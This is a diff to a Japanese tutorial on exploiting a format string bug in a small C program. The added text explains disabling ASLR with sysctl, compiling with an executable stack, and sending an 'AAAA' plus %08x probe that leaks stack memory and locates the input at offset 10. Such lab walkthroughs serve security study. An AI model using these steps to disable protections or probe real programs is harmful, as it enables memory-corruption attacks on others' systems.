@@ -23,18 +23,26 @@ int main(int argc, char *argv[])
 
 # コンパイル
 
+まずASLR (Address space layout randomization)を無効化しておく
+なお、この設定は、コンピュータを再起動すると元に戻ってしまう（kernel.randomize_va_space が 2 に戻る）
+
 ```sh
 $ sudo sysctl -a | grep kernel.randomize_va_space
 kernel.randomize_va_space = 2
 $ sudo sysctl -w kernel.randomize_va_space=0
 kernel.randomize_va_space = 0
+```
+
+以下のオプションをつけてコンパイルする
+
+```sh
 $ gcc -m32 -z execstack fsb.c -o fsb
 $ ./fsb $(python -c 'print "AAAA" + ".%08x"*16')
 [+] buf = 0xffffd1e8
 AAAA.ffffd517.00000064.00f0b5ff.ffffd20e.00000001.000000c2.ffffd304.ffffd20e.ffffd310.41414141.3830252e.30252e78.252e7838.2e783830.78383025.3830252e
 ```
 
-最初の**AAAA**を*0*とすると、*10*番目に**41414141**、すなわちASCIIコードの**AAAA**が表示されている
+出力結果から、最初の**AAAA**を*0*とすると、*10*番目に**41414141**、すなわちASCIIコードの**AAAA**が表示されていることがわかる
 
 # GDB
 
